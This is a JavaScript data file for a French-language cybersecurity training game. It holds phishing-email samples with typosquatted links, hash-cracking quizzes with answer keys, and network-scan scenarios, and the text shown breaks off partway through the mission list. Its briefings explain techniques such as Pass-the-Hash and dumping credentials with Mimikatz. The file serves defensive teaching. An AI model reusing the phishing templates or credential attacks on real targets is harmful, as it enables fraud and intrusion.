export const RANKS = [
  { name: 'Script Kiddie', minXP: 0    },
  { name: 'Pentester',     minXP: 500  },
  { name: 'Red Teamer',    minXP: 1500 },
  { name: 'CISO',          minXP: 3000 },
];

export const TOOLS = [
  {
    id: 'nmap', name: 'Nmap', icon: '🔍',
    description: 'Scanner de ports et détection de services réseau',
    level: 1, maxLevel: 5, cost: 80,
    passive: '+10% XP missions réseau par niveau',
    missionType: 'network',
    hint: 'Révèle le niveau de risque de chaque service sur le réseau',
  },
  {
    id: 'john', name: 'John the Ripper', icon: '🔓',
    description: 'Craqueur de mots de passe (dictionnaire & brute-force)',
    level: 0, maxLevel: 5, cost: 100,
    passive: '+20% XP missions hash par niveau',
    missionType: 'hash',
    hint: 'Identifie et écarte les attaques inadaptées à l\'algorithme',
  },
  {
    id: 'burp', name: 'Burp Suite', icon: '🕷️',
    description: 'Proxy d\'interception et scanner de vulnérabilités web',
    level: 0, maxLevel: 5, cost: 150,
    passive: '+15% XP missions CTF par niveau',
    missionType: 'ctf',
    hint: 'Inspecte le code et signale les lignes suspectes',
  },
  {
    id: 'wireshark', name: 'Wireshark', icon: '🦈',
    description: 'Analyseur de trafic réseau en temps réel',
    level: 0, maxLevel: 5, cost: 200,
    passive: '+10% crédits sur toutes les missions par niveau',
    missionType: 'all',
    hint: 'Analyse le trafic et augmente les récompenses en crédits',
  },
  {
    id: 'metasploit', name: 'Metasploit', icon: '💀',
    description: 'Framework d\'exploitation de vulnérabilités',
    level: 0, maxLevel: 5, cost: 350,
    passive: '+25% XP sur toutes les missions par niveau',
    missionType: 'all',
    hint: 'Amplifie l\'expérience gagnée sur toutes les missions',
  },
];

export const SKILLS = {
  recon: {
    name: 'Reconnaissance', color: 'var(--green)',
    nodes: [
      { id: 'osint',       name: 'OSINT Basics',     cost: 50,  requires: null,       effect: '+5% crédits par mission' },
      { id: 'portscan',    name: 'Port Scan Pro',     cost: 100, requires: 'osint',    effect: '+15% XP missions réseau' },
      { id: 'fingerprint', name: 'OS Fingerprinting', cost: 150, requires: 'portscan', effect: 'Révèle les OS sur le réseau' },
    ],
  },
  exploit: {
    name: 'Exploitation', color: 'var(--red)',
    nodes: [
      { id: 'sqli',    name: 'SQLi Hunter',     cost: 75,  requires: null,   effect: '+10% XP missions CTF' },
      { id: 'xss',     name: 'XSS Master',      cost: 100, requires: 'sqli', effect: '+10% XP missions CTF web' },
      { id: 'privesc', name: 'Priv. Escalation', cost: 200, requires: 'xss',  effect: '+20% XP toutes missions' },
    ],
  },
  defense: {
    name: 'Défense', color: 'var(--blue)',
    nodes: [
      { id: 'phishing_eye', name: 'Phishing Eye',  cost: 50,  requires: null,           effect: 'Révèle les leurres sur missions phishing' },
      { id: 'log_analysis', name: 'Log Analysis',  cost: 100, requires: 'phishing_eye', effect: '+10% crédits toutes missions' },
      { id: 'threat_intel', name: 'Threat Intel',  cost: 175, requires: 'log_analysis', effect: '+25% crédits toutes missions' },
    ],
  },
};

export const MISSIONS = [

  // ── PHISHING ──────────────────────────────────────────────

  {
    id: 'phishing_paypal', type: 'phishing', title: 'Alerte : Email Suspect',
    difficulty: 1, xpReward: 80, creditReward: 50,
    description: 'Un employé a transféré cet email au SOC. Analysez-le et cochez tous les red flags.',
    email: {
      from: 'securite@paypa1-support.com', to: 'jean.dupont@entreprise.fr',
      subject: 'URGENT : Votre compte PayPal a été suspendu', date: '23 Avr 2026, 03:47',
      body: `Cher client PayPal,

Nous avons détécté une activité SUSPECTE sur votre compte.
Votre accès a été temporairement SUSPENDU pour votre sécurité.

Pour réactiver votre compte dans les 24h, cliquez ici :

  http://paypa1-secure-login.ru/verify?token=JD8847

Si vous n'agissez pas immédiatement, votre compte sera DÉFINITIVEMENT
supprimé et vos fonds seront bloqués.

Cordialement,
L'équipe Securité PayPal
service.client@paypal.com`,
      link: 'http://paypa1-secure-login.ru/verify?token=JD8847',
    },
    options: [
      { id: 'a', text: 'L\'expéditeur utilise "paypa1" (chiffre 1) au lieu de "paypal"', correct: true },
      { id: 'b', text: 'L\'email est rédigé en français', correct: false },
      { id: 'c', text: 'Le lien pointe vers un domaine .ru sans rapport avec PayPal', correct: true },
      { id: 'd', text: 'Le message crée une urgence artificielle ("URGENT", "24h", "immédiatement")', correct: true },
      { id: 'e', text: 'Fautes typographiques : "détécté" et "Securité"', correct: true },
      { id: 'f', text: 'L\'email est envoyé à 3h47 du matin', correct: true },
      { id: 'g', text: 'PayPal est une entreprise américaine', correct: false },
      { id: 'h', text: 'L\'email contient une menace de suppression de compte', correct: true },
    ],
    phishingEyeHints: ['b', 'g'],
    tooltip: {
      success: 'Excellent ! Ces techniques reproduisent les attaques réelles qui ciblent des millions de personnes chaque jour.',
      fail: 'Indices clés : domaine "paypa1" (typosquatting), TLD .ru, urgence artificielle, fautes typographiques, heure suspecte, menace de suppression.',
      knowledge: 'Le phishing est responsable de 36% des violations de données (Verizon DBIR 2024). Les attaquants exploitent la peur et l\'urgence pour court-circuiter le raisonnement critique.',
    },
    debrief: [
      'Le typosquatting (paypa1 vs paypal) exploite les fautes de lecture rapide.',
      'Vérifiez TOUJOURS le domaine de l\'expéditeur — le nom affiché peut être falsifié.',
      'Survolez un lien avant de cliquer pour voir l\'URL réelle.',
      'Un prestataire légitime ne vous demandera jamais vos identifiants par email.',
    ],
  },

  {
    id: 'phishing_microsoft', type: 'phishing', title: 'Mot de Passe Expiré',
    difficulty: 1, xpReward: 75, creditReward: 45,
    description: 'Le service desk a reçu une plainte suite à cet email. Est-il légitime ou malveillant ?',
    email: {
      from: 'noreply@micros0ft-account.com', to: 'marie.martin@corp.fr',
      subject: 'Action requise : votre mot de passe Microsoft 365 expire dans 24h',
      date: '22 Avr 2026, 09:13',
      body: `Bonjour Marie Martin,

Votre mot de passe Microsoft 365 arrive à expiration.
Pour continuer à accéder à vos emails et fichiers,
vous devez le renouveler MAINTENANT.

Cliquez ici pour renouveler votre mot de passe :

  https://micros0ft-account.com/renew?user=mmartin

Attention : sans action de votre part, votre compte
sera désactivé dans 24 heures.

Microsoft Corporation
One Microsoft Way, Redmond WA`,
      link: 'https://micros0ft-account.com/renew?user=mmartin',
    },
    options: [
      { id: 'a', text: 'Le domaine expéditeur "micros0ft" contient un 0 (zéro) à la place du O', correct: true },
      { id: 'b', text: 'L\'email est signé avec l\'adresse réelle de Microsoft', correct: false },
      { id: 'c', text: 'Le lien pointe vers "micros0ft-account.com" et non "microsoft.com"', correct: true },
      { id: 'd', text: 'L\'email crée une urgence avec un délai de 24h et menace de désactivation', correct: true },
      { id: 'e', text: 'Le HTTPS dans le lien prouve que le site est légitime', correct: false },
      { id: 'f', text: 'Le nom de l\'utilisateur est inclus dans l\'URL (?user=mmartin)', correct: true },
      { id: 'g', text: 'La mise en page sobre et professionnelle confirme l\'authenticité', correct: false },
    ],
    phishingEyeHints: ['b', 'e', 'g'],
    tooltip: {
      success: 'Bien joué ! Le HTTPS est un piège classique : il garantit le chiffrement, pas la légitimité du site. N\'importe qui peut obtenir un certificat SSL gratuit (Let\'s Encrypt).',
      fail: 'Attention au HTTPS : un cadenas vert ne signifie PAS que le site est légitime. 90% des sites de phishing utilisent maintenant HTTPS.',
      knowledge: 'Le HTTPS est systématiquement exploité dans les phishing modernes. Let\'s Encrypt délivre des certificats gratuits en quelques minutes. Le seul indicateur fiable reste le nom de domaine exact.',
    },
    debrief: [
      'HTTPS ≠ site légitime. Le cadenas signifie chiffrement, pas confiance.',
      'Vérifiez toujours le domaine exact : microsoft.com vs micros0ft-account.com.',
      'Microsoft ne demande jamais de renouveler un mot de passe par email.',
      'En cas de doute, accédez directement au service via votre navigateur.',
    ],
  },

  {
    id: 'phishing_dhl', type: 'phishing', title: 'Colis en Attente',
    difficulty: 2, xpReward: 90, creditReward: 60,
    description: 'Un utilisateur a failli cliquer sur ce lien. Identifiez tous les indicateurs de compromission.',
    email: {
      from: 'livraison@dh1-express.net', to: 'pierre.leroy@mail.com',
      subject: 'Votre colis #FR291847 - Tentative de livraison échouée',
      date: '21 Avr 2026, 14:22',
      body: `Cher client,

Notre transporteur a tenté de livrer votre colis #FR291847
aujourd'hui mais personne n'était présent à l'adresse indiquée.

Pour reprogrammer votre livraison, des frais de douane
de 2,99€ sont à régler dans les 48h :

  http://dh1-express.net/reprogrammer?id=FR291847&pay=1

Passé ce délai, votre colis sera retourné à l'expéditeur.

Service Livraison DHL Express
© DHL International GmbH`,
      link: 'http://dh1-express.net/reprogrammer?id=FR291847&pay=1',
    },
    options: [
      { id: 'a', text: 'Le domaine "dh1-express.net" utilise un 1 au lieu du L dans DHL', correct: true },
      { id: 'b', text: 'DHL utilise "dhl.com", jamais "dhl-express.net"', correct: true },
      { id: 'c', text: 'La demande de 2,99€ pour "frais de douane" est un vecteur classique', correct: true },
      { id: 'd', text: 'Le lien utilise HTTP (non chiffré) au lieu de HTTPS', correct: true },
      { id: 'e', text: 'Le numéro de colis #FR291847 semble authentique', correct: false },
      { id: 'f', text: 'Le délai de 48h crée une pression temporelle', correct: true },
      { id: 'g', text: 'Le copyright "DHL International GmbH" est le vrai nom légal de DHL', correct: false },
      { id: 'h', text: 'Le paramètre "pay=1" dans l\'URL est suspect pour un service de livraison', correct: true },
    ],
    phishingEyeHints: ['e', 'g'],
    tooltip: {
      success: 'Excellent ! La demande de petit paiement (2,99€) semble anodine mais collecte vos données bancaires complètes.',
      fail: 'Indices clés : domaine dh1-express.net (faux), HTTP sans S, paiement demandé par email, délai artificiel.',
      knowledge: 'Les arnaques à la livraison représentent 27% des phishing en 2024. La technique du "petit paiement" (1-5€) vise à obtenir vos données bancaires sous prétexte d\'une somme dérisoire.',
    },
    debrief: [
      'DHL, FedEx, La Poste n\'envoient jamais d\'emails demandant un paiement pour livrer.',
      'Vérifiez le numéro de suivi directement sur le site officiel du transporteur.',
      'HTTP sans S = données en clair — ne jamais payer sur un site HTTP.',
      'Un paiement de 2,99€ capture vos données bancaires complètes, utilisables pour de gros débits.',
    ],
  },

  {
    id: 'phishing_linkedin', type: 'phishing', title: 'Offre d\'Emploi Suspecte',
    difficulty: 2, xpReward: 95, creditReward: 65,
    description: 'Un RH a reçu cette offre en réponse à un CV posté en ligne. Analysez-la attentivement.',
    email: {
      from: 'recrutement@linkedin-jobs.info', to: 'sophie.bernard@email.fr',
      subject: 'Offre exclusive : Senior Dev React - 85K€ - Full Remote',
      date: '20 Avr 2026, 11:05',
      body: `Bonjour Sophie,

Suite à votre profil LinkedIn, notre équipe de recrutement
vous propose un poste de Senior Developer React en full remote.

Poste     : Senior React Developer
Salaire   : 85 000€ brut annuel
Avantages : full remote, 35 jours de congés, stock options

Pour postuler, envoyez votre CV + pièce d'identité + RIB à :
  recrutement@linkedin-jobs.info

Ou complétez notre formulaire :
  http://linkedin-jobs.info/apply?ref=SB

Répondez avant le 25 Avril — poste à pourvoir immédiatement.

Lisa Chen — Head of Talent Acquisition
LinkedIn Careers`,
      link: 'http://linkedin-jobs.info/apply?ref=SB',
    },
    options: [
      { id: 'a', text: 'Le domaine "linkedin-jobs.info" n\'est pas le domaine officiel de LinkedIn', correct: true },
      { id: 'b', text: 'Demande d\'une pièce d\'identité ET d\'un RIB dès le premier contact', correct: true },
      { id: 'c', text: 'Le salaire proposé (85K€ full remote) est attractif mais pas impossible', correct: false },
      { id: 'd', text: 'Le lien de candidature pointe vers linkedin-jobs.info et non linkedin.com', correct: true },
      { id: 'e', text: 'L\'email ne mentionne pas le nom de l\'entreprise qui recrute', correct: true },
      { id: 'f', text: 'La signature professionnelle avec nom complet prouve l\'authenticité', correct: false },
      { id: 'g', text: 'L\'urgence "avant le 25 Avril — immédiatement" force une décision rapide', correct: true },
    ],
    phishingEyeHints: ['c', 'f'],
    tooltip: {
      success: 'Bien vu ! La demande de RIB + pièce d\'identité dès le premier contact est le signal le plus critique : usurpation d\'identité et virements frauduleux.',
      fail: 'L\'arnaque à l\'emploi cible une émotion positive. Indices : domaine non officiel, documents sensibles demandés immédiatement, pas de nom d\'entreprise.',
      knowledge: 'Les arnaques à l\'emploi ont augmenté de +300% en 2023-2024. La collecte d\'une pièce d\'identité + RIB permet l\'ouverture de comptes frauduleux au nom de la victime.',
    },
    debrief: [
      'LinkedIn ne contacte jamais par email pour proposer des offres d\'emploi directes.',
      'Ne jamais envoyer pièce d\'identité + RIB avant un entretien vérifié.',
      'Vérifiez l\'entreprise sur LinkedIn directement — cherchez "Lisa Chen".',
      'Une offre trop belle doit déclencher votre vigilance, pas votre enthousiasme.',
    ],
  },

  {
    id: 'phishing_ceo', type: 'phishing', title: 'Fraude au Président',
    difficulty: 3, xpReward: 150, creditReward: 100,
    description: 'Email reçu par le service comptabilité. C\'est la mission la plus délicate — les indices sont subtils.',
    email: {
      from: 'alexandre.dupont@entreprise-corp.fr',
      replyTo: 'a.dupont.ceo@gmail.com',
      to: 'comptabilite@entreprise-corp.fr',
      subject: 'Virement confidentiel - Action immédiate requise',
      date: '23 Avr 2026, 08:02',
      body: `Bonjour,

Je suis actuellement en déplacement pour une acquisition
stratégique confidentielle. J'ai besoin de votre aide
pour effectuer un virement urgent de 47 500€.

IBAN        : FR76 3000 6000 0112 3456 7890 189
Bénéficiaire: Meridian Consulting Ltd
Référence   : ACQ-2026-04

Cette opération est strictement confidentielle — n'en
parlez à personne pour l'instant, pas même à votre
responsable direct. Je vous expliquerai tout à mon retour.

Confirmez-moi par retour de mail quand c'est fait.

Alexandre Dupont — PDG, Entreprise Corp`,
      link: null,
    },
    options: [
      { id: 'a', text: 'L\'adresse d\'expédition semble légitime (@entreprise-corp.fr)', correct: false },
      { id: 'b', text: 'Le Reply-To est une adresse Gmail personnelle différente de l\'expéditeur', correct: true },
      { id: 'c', text: 'La demande de confidentialité absolue ("n\'en parlez à personne") est un signal majeur', correct: true },
      { id: 'd', text: 'Le montant précis (47 500€) suggère une facture réelle', correct: false },
      { id: 'e', text: 'La demande contourne les procédures de validation hiérarchique', correct: true },
      { id: 'f', text: 'Le contexte "acquisition confidentielle en déplacement" est invérifiable', correct: true },
      { id: 'g', text: 'L\'email demande une confirmation email sans rappel téléphonique', correct: true },
      { id: 'h', text: 'L\'IBAN est au format français valide', correct: false },
    ],
    phishingEyeHints: ['a', 'd', 'h'],
    tooltip: {
      success: 'Excellente analyse ! Le Reply-To Gmail est le signe technique clé : l\'attaquant a usurpé l\'adresse d\'envoi mais redirige les réponses vers sa boîte Gmail.',
      fail: 'La fraude au président est la plus difficile à détecter. Le Reply-To Gmail différent de l\'expéditeur est le signal technique principal. La demande de confidentialité est le signal humain le plus fort.',
      knowledge: 'La fraude au président (BEC) a coûté 2,9 milliards de dollars aux entreprises en 2023 (FBI IC3). C\'est l\'arnaque la plus rentable pour les cybercriminels organisés.',
    },
    debrief: [
      'Vérifiez toujours le Reply-To : il peut différer de l\'expéditeur affiché.',
      '"Gardez le secret" est le signal social d\'alarme n°1 de la fraude au président.',
      'Tout virement exceptionnel doit être validé par appel téléphonique au numéro officiel.',
      'Appelez le PDG sur son numéro habituel — jamais sur celui fourni dans l\'email suspect.',
    ],
  },

  // ── HASH ──────────────────────────────────────────────────

  {
    id: 'hash_md5', type: 'hash', title: 'Operation Hash Buster',
    difficulty: 1, xpReward: 60, creditReward: 40,
    description: 'Hash extrait d\'une base de données non chiffrée. Identifiez l\'algorithme et choisissez l\'attaque la plus efficace.',
    hashValue: '5f4dcc3b5aa765d61d8327deb882cf99',
    hashHint: '32 caractères hexadécimaux • pas de salt détecté',
    options: [
      { id: 'rainbow', name: 'Rainbow Table Attack', description: 'Recherche dans des tables précalculées de millions de hashes connus.', correct: true },
      { id: 'brute',   name: 'Brute Force (8 caractères)', description: 'Teste exhaustivement toutes les combinaisons de caractères.', correct: false, johnHint: true },
      { id: 'bcrypt',  name: 'Bcrypt Cracker spécialisé', description: 'Outil optimisé pour les hashes bcrypt avec work factor.', correct: false, johnElim: true },
      { id: 'social',  name: 'Social Engineering', description: 'Manipuler l\'utilisateur pour obtenir son mot de passe directement.', correct: false, johnElim: true },
    ],
    tooltip: {
      success: 'Parfait ! MD5 sans salt est l\'un des hashes les plus faibles. Ce hash correspond à "password".',
      fail: 'MD5 sans salt est vulnérable aux rainbow tables. Le salt sert précisément à les rendre inutilisables.',
      knowledge: 'MD5 ne doit JAMAIS servir à stocker des mots de passe. Les standards actuels sont bcrypt, Argon2id ou scrypt, avec un salt unique par utilisateur.',
    },
    debrief: [
      'MD5 a été conçu pour la vérification d\'intégrité, pas pour les mots de passe.',
      'crackstation.net contient des milliards de hashes MD5 précalculés.',
      'Un salt aléatoire unique rend les rainbow tables totalement inutiles.',
      'En 2026, bcrypt (cost≥12) ou Argon2id sont les recommandations OWASP.',
    ],
  },

  {
    id: 'hash_sha1', type: 'hash', title: 'Empreinte Ancienne Génération',
    difficulty: 1, xpReward: 65, creditReward: 42,
    description: 'Hash extrait d\'une ancienne application web. Identifiez l\'algorithme et la meilleure stratégie d\'attaque.',
    hashValue: 'aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d',
    hashHint: '40 caractères hexadécimaux • format cohérent avec SHA-1',
    options: [
      { id: 'rainbow_sha1', name: 'Rainbow Table (SHA-1)',      description: 'Tables précalculées spécifiques à SHA-1 — très efficace sans salt.', correct: true },
      { id: 'gpu_brute',    name: 'GPU Brute Force',            description: 'Hashcat sur GPU — des milliards de SHA-1 par seconde.', correct: false, johnHint: true },
      { id: 'md5_tools',   name: 'Outils MD5 spécialisés',    description: 'Tables optimisées pour MD5.', correct: false, johnElim: true },
      { id: 'sha256_crack', name: 'SHA-256 Cracker',            description: 'Outil optimisé pour les hashes SHA-256.', correct: false, johnElim: true },
    ],
    tooltip: {
      success: 'Exact ! SHA-1 produit des empreintes de 40 caractères. Sans salt, il est aussi vulnérable aux rainbow tables que MD5.',
      fail: 'La longueur du hash est votre premier indice : 32=MD5, 40=SHA-1, 64=SHA-256. SHA-1 sans salt est faible face aux rainbow tables.',
      knowledge: 'SHA-1 a été officiellement cassé par Google en 2017 (attaque SHAttered). Il ne doit plus être utilisé pour les certificats TLS, mots de passe, ni l\'intégrité des fichiers.',
    },
    debrief: [
      'Longueur du hash : 32 chars=MD5, 40=SHA-1, 64=SHA-256, 128=SHA-512.',
      'Google a produit la première collision SHA-1 en 2017 avec 6 500 années-CPU.',
      'Les navigateurs rejettent les certificats TLS signés avec SHA-1 depuis 2017.',
      'Pour les mots de passe, utilisez bcrypt/Argon2 — pas SHA-1 ni SHA-256.',
    ],
  },

  {
    id: 'hash_ntlm', type: 'hash', title: 'Extraction Active Directory',
    difficulty: 2, xpReward: 110, creditReward: 75,
    description: 'Hash extrait de la base SAM d\'un contrôleur de domaine Windows. Quelle technique est la plus redoutable ici ?',
    hashValue: 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c',
    hashHint: 'Format LM:NTLM • extrait par Mimikatz sur Windows Server 2019',
    options: [
      { id: 'pass_the_hash', name: 'Pass-the-Hash (PtH)',        description: 'Utiliser directement le hash NTLM pour s\'authentifier sans connaître le mot de passe clair.', correct: true },
      { id: 'rainbow_ntlm',  name: 'Rainbow Tables NTLM',        description: 'Tables précalculées spécifiques au format NTLM.', correct: false, johnHint: true },
      { id: 'decrypt_lm',    name: 'Déchiffrement de la partie LM', description: 'Le hash LAN Manager est encore plus faible que NTLM.', correct: false, johnElim: true },
      { id: 'brute_ad',      name: 'Brute Force via interface AD', description: 'Tenter des authentifications en masse sur le contrôleur de domaine.', correct: false, johnElim: true },
    ],
    tooltip: {
      success: 'Parfait ! Pass-the-Hash est l\'attaque reine dans les environnements Active Directory. Le protocole NTLM accepte le hash lui-même comme preuve d\'identité.',
      fail: 'Dans un contexte Active Directory, le hash NTLM suffit à s\'authentifier. C\'est la puissance du Pass-the-Hash : pas besoin de craquer le hash.',
      knowledge: 'Pass-the-Hash (PtH) est l\'une des techniques les plus utilisées en post-exploitation AD. Microsoft recommande LAPS, Protected Users, et le tiering administratif pour limiter la propagation latérale.',
    },
    debrief: [
      'NTLM utilise le hash comme token d\'auth — PtH contourne totalement le besoin du mot de passe.',
      'Mimikatz extrait les hashes NTLM de la mémoire lsass.exe en une commande.',
      'Défense : activer Credential Guard, désactiver NTLM, implémenter LAPS.',
      'La partie LM "aad3b435b51404ee" est le hash vide — LM est désactivé ici (bonne nouvelle).',
    ],
  },

  {
    id: 'hash_salted', type: 'hash', title: 'Shadow File Linux',
    difficulty: 2, xpReward: 105, creditReward: 70,
    description: 'Ligne extraite du /etc/shadow d\'un serveur Linux compromis. Identifiez la meilleure approche pour ce type de hash.',
    hashValue: '$6$rounds=5000$BPW6dUiZ$9tgMCE0bFja...(tronqué)',
    hashHint: 'Format /etc/shadow — $6$ = SHA-512crypt • salt intégré • rounds=5000',
    options: [
      { id: 'dict_salt',    name: 'Dictionnaire + Hashcat (mode -m 1800)', description: 'Teste des mots courants en calculant le hash avec le salt extrait.', correct: true },
      { id: 'rainbow_lin',  name: 'Rainbow Tables Linux/SHA-512', description: 'Tables précalculées pour SHA-512 Linux.', correct: false, johnElim: true },
      { id: 'john_shadow',  name: 'John the Ripper avec règles de mutation', description: 'John applique des règles (leetspeak, suffixes...) sur un dictionnaire.', correct: false, johnHint: true },
      { id: 'crack_online', name: 'Service de cracking en ligne (crackstation)', description: 'Soumettre le hash à un service public.', correct: false, johnElim: true },
    ],
    tooltip: {
      success: 'Correct ! Le salt change tout : chaque hash est unique même pour le même mot de passe. Hashcat recalcule le hash avec le salt pour chaque candidat.',
      fail: 'Le salt invalide complètement les rainbow tables. Seule une attaque par dictionnaire avec le salt est viable.',
      knowledge: 'Le format /etc/shadow encode : algorithme ($6$=SHA-512), salt aléatoire, et hash. Les "rounds" ralentissent intentionnellement le calcul — défense contre le brute force.',
    },
    debrief: [
      'Préfixe : $1$=MD5crypt, $5$=SHA-256crypt, $6$=SHA-512crypt.',
      'Le salt est stocké en clair dans le hash — nécessaire pour la vérification.',
      'Les "rounds" implémentent le key stretching : calcul intentionnellement lent.',
      'Pour dumper /etc/shadow, il faut les droits root — l\'élévation de privilèges précède cette étape.',
    ],
  },

  {
    id: 'hash_bcrypt', type: 'hash', title: 'Modern App — bcrypt Challenge',
    difficulty: 3, xpReward: 160, creditReward: 110,
    description: 'Hash extrait d\'une application Node.js moderne. Évaluez la résistance et choisissez la meilleure approche.',
    hashValue: '$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LeGH9U3VRaGc2K.G',
    hashHint: '$2b$ = bcrypt • cost factor = 12 • salt intégré (22 chars)',
    options: [
      { id: 'targeted_dict',  name: 'Dictionnaire ciblé (OSINT + rockyou.txt)', description: 'Combiner des infos OSINT (prénom, date naissance) avec un dictionnaire personnalisé.', correct: true },
      { id: 'rainbow_bcrypt', name: 'Rainbow Tables bcrypt', description: 'Tables précalculées pour bcrypt.', correct: false, johnElim: true },
      { id: 'gpu_brute',      name: 'Brute Force GPU massif (8 chars)', description: 'Louer un cluster GPU et tester toutes les combinaisons.', correct: false, johnElim: true },
      { id: 'wordlist_rules', name: 'Wordlist + règles Hashcat (best64)', description: 'Appliquer des transformations sur rockyou.txt.', correct: false, johnHint: true },
    ],
    tooltip: {
      success: 'Excellent jugement ! bcrypt cost 12 rend le brute force impossible en pratique. Seul un dictionnaire très ciblé basé sur l\'OSINT est réaliste.',
      fail: 'bcrypt est conçu pour résister au brute force. Son salt invalide les rainbow tables, et son work factor limite à ~200 hash/sec sur GPU.',
      knowledge: 'bcrypt est le standard de l\'industrie pour les mots de passe depuis 1999. Le cost factor est adaptatif. En 2026, cost 12-14 est recommandé (OWASP).',
    },
    debrief: [
      'bcrypt cost 12 = 4096 rounds — intentionnellement lent.',
      'RTX 4090 : 14 milliards MD5/sec vs 200 bcrypt/sec — facteur ×70 millions.',
      'L\'OSINT (réseaux sociaux, LinkedIn, HIBP) permet des wordlists personnalisées efficaces.',
      'Une longue passphrase reste sûre même face à un dictionnaire ciblé.',
    ],
  },

  // ── NETWORK ───────────────────────────────────────────────

  {
    id: 'network_ftp', type: 'network', title: 'Scan Interne : Accès Anonyme',
    difficulty: 1, xpReward: 85, creditReward: 55,
    description: 'Nmap a scanné ce réseau de PME. Identifiez le service le plus immédiatement exploitable.',
    nodes: [
      { id: 'router',      icon: '🔀', name: 'Routeur',         ip: '10.0.0.1',  ports: '80/tcp (HTTP admin) • 53/tcp (DNS)', note: 'Firmware à jour — admin protégé par mot de passe', vulnerable: false, riskLevel: 'LOW',      riskReason: 'Firmware à jour, admin protégé.' },
      { id: 'ftp',         icon: '📁', name: 'Serveur FTP',     ip: '10.0.0.20', ports: '21/tcp (FTP) • 22/tcp (SSH)', note: 'vsftpd 2.3.4 — connexion anonyme ACTIVÉE — /pub accessible', vulnerable: true,  riskLevel: 'CRITIQUE', riskReason: 'FTP anonyme activé — accès non authentifié.' },
      { id: 'nas',         icon: '💾', name: 'NAS Synology',    ip: '10.0.0.30', ports: '5000/tcp (HTTP) • 445/tcp (SMB)', note: 'DSM 7.2 — accès local uniquement • 2FA activé', vulnerable: false, riskLevel: 'LOW',      riskReason: 'Accès local, 2FA, DSM à jour.' },
      { id: 'workstation', icon: '💻', name: 'Poste Comptable', ip: '10.0.0.50', ports: '3389/tcp (RDP)', note: 'Windows 10 — patchs à jour', vulnerable: false, riskLevel: 'MEDIUM',   riskReason: 'RDP activé mais système patché.' },
    ],
    correctNodeId: 'ftp',
    tooltip: {
      success: 'Correct ! Un FTP avec accès anonyme est une vulnérabilité critique : n\'importe qui sur le réseau accède aux fichiers sans identifiants.',
      fail: 'Le serveur FTP : connexion anonyme = accès non authentifié immédiat. FTP transmet aussi données et identifiants en clair.',
      knowledge: 'FTP est un protocole des années 70 : tout transite en clair. Utilisez SFTP (SSH File Transfer Protocol) ou FTPS — jamais FTP nu avec anonymat activé.',
    },
    debrief: [
      'FTP anonyme = porte ouverte : aucune authentification pour accéder aux fichiers.',
      'FTP transmet en clair : Wireshark capture identifiants et fichiers instantanément.',
      'vsftpd 2.3.4 a une backdoor connue (CVE-2011-2523) — mettre à jour immédiatement.',
      'Remplacez FTP par SFTP (port 22, chiffré, authentifié) — sous-commande SSH.',
    ],
  },

  {
    id: 'network_telnet', type: 'network', title: 'Protocoles Hérités Détectés',
    difficulty: 1, xpReward: 80, creditReward: 52,
    description: 'Audit réseau d\'une infrastructure industrielle. Un protocole particulièrement dangereux est encore en usage.',
    nodes: [
      { id: 'plc',       icon: '⚙️', name: 'Automate PLC',    ip: '172.16.0.10', ports: '23/tcp (Telnet) • 102/tcp (S7comm)', note: 'Siemens S7-300 — interface Telnet pour maintenance', vulnerable: true,  riskLevel: 'CRITIQUE', riskReason: 'Telnet en clair + protocole S7 non authentifié.' },
      { id: 'hmi',       icon: '🖥️', name: 'Interface HMI',   ip: '172.16.0.20', ports: '80/tcp (HTTP) • 8080/tcp (API)', note: 'WinCC OA — accès réseau interne uniquement', vulnerable: false, riskLevel: 'MEDIUM',   riskReason: 'HTTP non chiffré mais accès limité.' },
      { id: 'historian', icon: '📊', name: 'Serveur Historian', ip: '172.16.0.30', ports: '1433/tcp (MSSQL) • 443/tcp (HTTPS)', note: 'OSIsoft PI — HTTPS activé — auth Windows intégrée', vulnerable: false, riskLevel: 'LOW',      riskReason: 'HTTPS, auth Windows, accès contrôlé.' },
      { id: 'firewall',  icon: '🔥', name: 'Firewall OT',     ip: '172.16.0.1',  ports: '443/tcp (HTTPS admin) • 22/tcp (SSH)', note: 'Fortinet FortiGate — à jour — accès admin restreint', vulnerable: false, riskLevel: 'LOW',      riskReason: 'À jour, admin HTTPS+SSH, accès restreint.' },
    ],
    correctNodeId: 'plc',
    tooltip: {
      success: 'Exact ! Telnet sur un automate industriel : toutes les commandes transitent en clair. Un attaquant peut intercepter et rejouer des commandes, causant des dommages physiques.',
      fail: 'L\'automate PLC : Telnet en clair + S7 sans authentification. Dans un contexte OT, compromettre un PLC peut avoir des conséquences physiques réelles.',
      knowledge: 'La sécurité OT/ICS est critique : une attaque cyber peut avoir des conséquences physiques. Stuxnet a détruit 20% des centrifugeuses iraniennes via des PLC Siemens en 2010.',
    },
    debrief: [
      'Telnet (1969) : aucun chiffrement, aucune authentification moderne.',
      'SSH remplace Telnet depuis 1995 — aucune raison valable d\'utiliser Telnet en 2026.',
      'Les environnements OT/ICS sont particulièrement vulnérables : systèmes vieux de 10-20 ans.',
      'Stuxnet (2010) a compromis des PLC Siemens S7 — même famille d\'équipement.',
    ],
  },

  {
    id: 'network_exposed', type: 'network', title: 'Scan Réseau : Surface d\'Attaque',
    difficulty: 2, xpReward: 100, creditReward: 75,
    description: 'Nmap vient de scanner le réseau interne. Identifiez le service le plus critique à exploiter en priorité.',
    nodes: [
      { id: 'router',      icon: '🔀', name: 'Routeur Cisco',    ip: '192.168.1.1',  ports: '22/tcp (SSH) • 80/tcp (HTTP→HTTPS) • 443/tcp (HTTPS)', note: 'Firmware v15.2 — à jour • SSH : auth par clé uniquement', vulnerable: false, riskLevel: 'LOW',      riskReason: 'SSH par clé, HTTP→HTTPS, firmware à jour.' },
      { id: 'webserver',   icon: '🌐', name: 'Serveur Web',      ip: '192.168.1.10', ports: '80/tcp (HTTP) • 8080/tcp (HTTP-alt) • 3306/tcp (MySQL)', note: 'Apache 2.2.8 (EOL 2018) • MySQL exposé publiquement', vulnerable: true,  riskLevel: 'CRITIQUE', riskReason: 'MySQL exposé internet + Apache EOL non patché.' },
      { id: 'workstation', icon: '💻', name: 'Poste de travail', ip: '192.168.1.50', ports: '445/tcp (SMB) • 3389/tcp (RDP)', note: 'Windows 11 — derniers patchs appliqués (2026-04)', vulnerable: false, riskLevel: 'MEDIUM',   riskReason: 'SMB/RDP ouverts mais système entièrement patché.' },
